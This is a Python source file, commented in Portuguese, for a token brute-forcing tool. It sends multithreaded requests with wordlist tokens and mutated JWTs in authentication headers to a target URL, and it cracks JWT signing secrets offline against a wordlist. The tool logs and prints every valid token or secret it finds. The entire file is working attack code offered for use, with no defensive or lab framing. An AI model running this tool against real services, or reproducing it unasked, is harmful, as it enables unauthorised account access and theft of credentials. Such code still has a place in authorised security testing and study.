"""
Módulo avançado para força bruta e fuzzing de tokens modernos (JWT, OAuth, Bearer, API Keys, etc).
"""

import jwt
import requests
import threading
import queue
import time
import logging
from utils.logger import logger
from utils.request_builder import build_headers
from utils.helpers import mutate_jwt, is_jwt
from termcolor import cprint

logging.basicConfig(filename='logs/token_bruteforce.log', level=logging.INFO, format='[%(asctime)s] %(message)s')

TOKEN_TYPES = ["jwt", "oauth", "basic", "bearer", "api", "verification", "custom"]

class TokenBruteforcer:
    def __init__(self, target_url, token_type="jwt", algorithm="HS256"):
        self.target_url = target_url
        self.token_type = token_type.lower()
        self.algorithm = algorithm
        self.success_patterns = {
            "jwt": self._check_jwt,
            "oauth": self._check_oauth,
            "basic": self._check_basic_auth,
            "bearer": self._check_bearer,
            "api": self._check_api_key,
            "verification": self._check_verification,
            "custom": self._check_custom
        }

    def _check_jwt(self, response):
        return response.status_code == 200 and ("jwt" in response.headers.get("Authorization", "").lower() or "jwt" in response.text.lower())

    def _check_oauth(self, response):
        return response.status_code == 200 and ("oauth" in response.headers.get("Authorization", "").lower() or "oauth" in response.text.lower())

    def _check_basic_auth(self, response):
        return response.status_code == 200 and ("basic" in response.headers.get("Authorization", "").lower() or "basic" in response.text.lower())

    def _check_bearer(self, response):
        return response.status_code == 200 and ("bearer" in response.headers.get("Authorization", "").lower() or "bearer" in response.text.lower())

    def _check_api_key(self, response):
        return response.status_code == 200 and ("api" in response.headers.get("Authorization", "").lower() or "api" in response.text.lower())

    def _check_verification(self, response):
        return response.status_code == 200 and ("verified" in response.text.lower() or "success" in response.text.lower())

    def _check_custom(self, response):
        return response.status_code == 200

    def _try_token(self, token, token_type):
        headers = build_headers()
        if token_type in ["jwt", "bearer", "oauth"]:
            headers["Authorization"] = f"Bearer {token}"
        elif token_type == "basic":
            headers["Authorization"] = f"Basic {token}"
        elif token_type == "api":
            headers["X-API-KEY"] = token
        else:
            headers["Authorization"] = token
        try:
            response = requests.get(self.target_url, headers=headers, timeout=10)
            return response
        except Exception as e:
            logger.error(f"Erro ao tentar token: {e}")
            return None

    def _bruteforce_worker(self, q, found, stop_flag, mutate, token_type):
        while not q.empty() and not stop_flag.is_set():
            token = q.get()
            tokens_to_try = [token]
            if mutate and token_type == "jwt" and is_jwt(token):
                tokens_to_try += mutate_jwt(token)
            for t in tokens_to_try:
                response = self._try_token(t, token_type)
                if response and self.success_patterns[token_type](response):
                    cprint(f"[+] Token válido encontrado: {t}", "green")
                    logger.info(f"Token válido encontrado: {t}")
                    found.append(t)
                    stop_flag.set()
                    break
                elif response:
                    logger.debug(f"Token testado: {t} | Status: {response.status_code}")
            q.task_done()

    def brute_force(self, wordlist_path, threads=16, mutate=False):
        with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
            tokens = [line.strip() for line in f if line.strip()]
        q = queue.Queue()
        for token in tokens:
            q.put(token)
        found = []
        stop_flag = threading.Event()
        thread_list = []
        for _ in range(threads):
            t = threading.Thread(target=self._bruteforce_worker, args=(q, found, stop_flag, mutate, self.token_type))
            t.daemon = True
            t.start()
            thread_list.append(t)
        q.join()
        return found

    def jwt_secret_bruteforce(self, jwt_token, wordlist_path):
        found = []
        with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
            secrets = [line.strip() for line in f if line.strip()]
        for secret in secrets:
            try:
                jwt.decode(jwt_token, secret, algorithms=[self.algorithm])
                cprint(f"[+] Segredo JWT encontrado: {secret}", "green")
                logger.info(f"Segredo JWT encontrado: {secret}")
                found.append(secret)
                break
            except Exception:
                continue
        return found

    def advanced_attack(self, wordlist_path, threads=16, mutate=True):
        cprint(f"[*] Iniciando ataque avançado de força bruta em {self.target_url} para token {self.token_type.upper()}", "cyan")
        logger.info(f"Iniciando ataque avançado em {self.target_url} para token {self.token_type.upper()}")
        found = self.brute_force(wordlist_path, threads=threads, mutate=mutate)
        if found:
            cprint(f"[✓] Token(s) válido(s) encontrado(s): {found}", "green")
        else:
            cprint("[x] Nenhum token válido encontrado.", "red")
        return found